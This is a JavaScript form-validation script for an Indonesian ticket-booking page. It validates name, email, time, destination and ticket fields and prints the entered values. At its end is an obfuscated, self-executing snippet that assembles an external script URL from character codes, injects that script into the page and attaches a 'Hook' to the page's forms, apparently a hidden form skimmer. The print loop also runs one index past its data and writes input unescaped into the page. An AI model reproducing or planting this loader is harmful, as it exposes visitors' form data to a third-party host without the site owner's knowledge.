function check(e) {
    e.preventDefault(); 
    // (C1) INIT
    let valid = true, error = "", field = "";
    
    // (C2) NAME
    field = document.getElementById("nama");
    error = document.getElementById("val-1");
    if (!field.checkValidity()) {
      valid = false;
      field.classList.add("err");
      error.innerHTML = "*) Harus lebih dari 1-30 huruf\r\n";
    } else {
      field.classList.remove("err");
      error.innerHTML = "";
    }
  
    field = document.getElementById("email");
    error = document.getElementById("val-2");
    if (!field.checkValidity()) {
      valid = false;
      field.classList.add("err");
      error.innerHTML = "*) Harus ada \"@\" dan \".\"\r\n";
    } else {
      field.classList.remove("err");
      error.innerHTML = "";
    }
  
    field = document.getElementById("jam");
    error = document.getElementById("val-3");
    if (!field.checkValidity()) {
      valid = false;
      field.classList.add("err");
      error.innerHTML = "*) Harus diisi\r\n";
    } else {
      field.classList.remove("err");
      error.innerHTML = "";
    }
  
    field = document.getElementById("tujuan");
    error = document.getElementById("val-4");
    if (!field.checkValidity()) {
      valid = false;
      field.classList.add("err");
      error.innerHTML = "*) Masukkan tempat tujuan\r\n";
    } else {
      field.classList.remove("err");
      error.innerHTML = "";
    }
  
    field = document.getElementById("tiket");
    error = document.getElementById("val-5");
    if (!field.checkValidity()) {
      valid = false;
      field.classList.add("err");
      error.innerHTML = "*) Jumlah tiket harus diisi 1 - 10\r\n";
    } else {
      field.classList.remove("err");
      error.innerHTML = "";
    }
    
    // (C4) RESULT
    return valid;
  }
  
  function cetak() {
    let form = document.getElementById("validation")
    let data = document.getElementById("data")
    let hasil = form.querySelectorAll("input:not([type=submit])")
    let teks = form.querySelectorAll("p")
    for (let i = 0; i <= hasil.length; i++) {
      data.innerHTML += teks[i].textContent + " : " + hasil[i].value + "<br>" 
    }
  }
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b